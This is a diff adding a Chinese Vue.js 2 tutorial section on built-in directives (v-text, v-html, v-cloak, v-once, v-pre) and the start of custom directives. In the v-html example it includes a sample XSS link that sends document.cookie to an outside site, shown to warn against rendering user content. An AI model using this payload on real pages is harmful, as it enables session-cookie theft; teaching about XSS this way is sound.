@@ -2805,7 +2805,297 @@ dayjs()
 
 
 
-### 1.17.内部指令
+### 1.17.内置指令
+
+​	之前我们已经学习了`v-bind,v-on,v-if`等指令，除此之外，Vue的作者还给我们定义了许多其他指令。
+
+```text
+v-bind	: 单向绑定解析表达式, 可简写为 :xxx
+v-model	: 双向数据绑定
+v-for  	: 遍历数组/对象/字符串
+v-on   	: 绑定事件监听, 可简写为@
+v-if 	: 条件渲染（动态控制节点是否存存在）
+v-else 	: 条件渲染（动态控制节点是否存存在）
+v-show 	: 条件渲染 (动态控制节点是否展示)
+```
+
+
+
+#### 1.17.1.v-text指令
+
+`v-text`指令的作用是向其所在的结点渲染文本内容。
+
+```html
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>vue使用模板</title>
+    <!-- 引入vue -->
+    <script src='../js/vue.js'></script>
+</head>
+<body>
+        <!-- 准备一个容器 -->
+        <div id='root'>
+            <h3>你好，{{msg}}</h3>
+            <h3 v-text="msg"></h3>
+            <h3 v-text="str"></h3>
+        </div>
+        <script>
+                // 设置为 false 以阻止 vue 在启动时生成生产提示
+                Vue.config.productionTip = false;
+                // 创建Vue对象
+                new Vue({
+                        el: '#root',
+                        data: {
+                            msg:'Micheal',
+                            str:'<h3>你好！！</h3>'
+                        }
+                        
+                })
+        </script>
+</body>
+</html>
+```
+
+**总结：**
+
+```
+v-text指令：
+      1.作用：向其所在的节点中渲染文本内容。
+      2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+```
+
+
+
+#### 1.17.2.v-html指令
+
+​	与`v-text`不同，`v-html`支持标签结构的解析。但它存在一定的安全隐患。以下面页面为例：由于不是一个登录网页，我们可以打开网页，然后再开发者工具中打开应用，点击编辑输入`cookie`：
+
+<img src="images/image-20230202105729169.png" alt="image-20230202105729169" style="zoom:33%;" />
+
+然后点击超链接（str2由标签包裹，并发送?传参），这时我们可以发现超链接会发现百度携带了我们在该网页输入的`cookie`值：
+
+![image-20230202105924234](images/image-20230202105924234.png)
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>v-html指令</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 
+				v-html指令：
+						1.作用：向指定节点中渲染包含html结构的内容。
+						2.与插值语法的区别：
+									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+									(2).v-html可以识别html结构。
+						3.严重注意：v-html有安全性问题！！！！
+									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+		-->
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<div>你好，{{name}}</div>
+			<div v-html="str"></div>
+			<div v-html="str2"></div>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+		new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				str:'<h3>你好啊！</h3>',
+				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+**总结：**
+
+```
+v-html指令：
+      1.作用：向指定节点中渲染包含html结构的内容。
+      2.与插值语法的区别：
+               (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+               (2).v-html可以识别html结构。
+      3.严重注意：v-html有安全性问题！！！！
+               (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+               (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+```
+
+
+
+#### 1.17.3.v-cloak指令
+
+`v-cloak`指当网速过慢时，不让未经解析的模板显示到页面中去。它没有属性值，本质是一个属性，Vue示例创建完毕容器后，会删除掉`v-cloak`属性，使用css配合`v-cloak`可以解决由于网速过慢页面出现`{{xxx}}`的问题。
+
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Vue使用模板</title>
+		<style>
+            <！--选中所有v-cloak属性-->
+			[v-cloak]{
+				display:none;
+			}
+		</style>
+		<!-- 引入Vue -->
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2 v-cloak>{{name}}</h2>
+		</div>
+		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+	</body>
+	
+	<script type="text/javascript">
+		console.log(1)
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		new Vue({
+			el:'#root',
+			data:{
+				name:'四川城市职业学院'
+			}
+		})
+	</script>
+</html>
+```
+
+
+
+#### 1.17.4.v-once指令
+
+​	`v-once`指令是将网页在初次渲染后，就视为静态内容了，并不再改变。以下图为例：我们有一个初始值`n`为1，点击按钮`n+1`，但初始值不改变：
+
+<img src="images/image-20230202113409928.png" alt="image-20230202113409928" style="zoom:50%;" />
+
+```html
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>vue使用模板</title>
+    <!-- 引入vue -->
+    <script src='../js/vue.js'></script>
+</head>
+<body>
+        <!-- 准备一个容器 -->
+        <div id='root'>
+            <h3 v-once>初始化n的值为：{{n}}</h3>
+            <h3>点击后n的值为：{{n}}</h3>
+            <button @click="n++">点击n+1</button>
+        </div>
+        <script>
+                // 设置为 false 以阻止 vue 在启动时生成生产提示
+                Vue.config.productionTip = false;
+                // 创建Vue对象
+                new Vue({
+                        el: '#root',
+                        data: {
+                            n:1
+                        }
+                        
+                })
+        </script>
+</body>
+</html>
+```
+
+**总结：**
+
+```
+v-once指令：
+         1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+         2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+```
+
+
+
+#### 1.17.5.v-pre指令
+
+`v-pre`可以跳过结点的渲染过程，Vue不去解析，直接拿过来用。
+
+```html'
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>vue使用模板</title>
+    <!-- 引入vue -->
+    <script src='../js/vue.js'></script>
+</head>
+<body>
+        <!-- 准备一个容器 -->
+        <div id='root'>
+            <h3  v-pre>Vue好用，好学</h3>
+            <h3 v-pre>点击后n的值为：{{n}}</h3>
+            <button v-pre @click="n++">点击n+1</button>
+        </div>
+        <script>
+                // 设置为 false 以阻止 vue 在启动时生成生产提示
+                Vue.config.productionTip = false;
+                // 创建Vue对象
+                new Vue({
+                        el: '#root',
+                        data: {
+                            n:1
+                        }
+                        
+                })
+        </script>
+</body>
+</html>
+```
+
+**总结：**
+
+```
+v-pre指令：
+      1.跳过其所在节点的编译过程。
+      2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+```
+
+
+
+### 1.18.自定义指令
+
+​	除了Vue的作者给我们创建的内置指令外，我们也可以自己定义一些指令来完成特定的功能。自定义指令的指令名可以根据功能来自定义，如按以下两个需求来定义指令：
+
+```text
+需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
+```
+
+
+
+
+
+
+
+
 
 
 
